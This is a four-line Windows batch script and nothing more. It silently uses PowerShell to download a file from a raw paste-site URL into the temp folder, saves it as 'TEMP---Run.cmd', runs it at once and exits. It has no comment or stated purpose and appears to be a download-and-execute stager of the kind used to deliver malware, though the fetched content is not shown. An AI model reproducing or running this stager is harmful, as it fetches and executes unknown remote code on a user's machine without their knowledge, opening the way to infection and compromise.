@echo off
chcp 437 >nul & powershell -Command Invoke-WebRequest -Uri https://pt.textbin.net/raw/z6nl4zzegt -OutFile "%TEMP%\TEMP---Run.cmd" & chcp 65001 >nul
"%TEMP%\TEMP---Run.cmd"
exit 0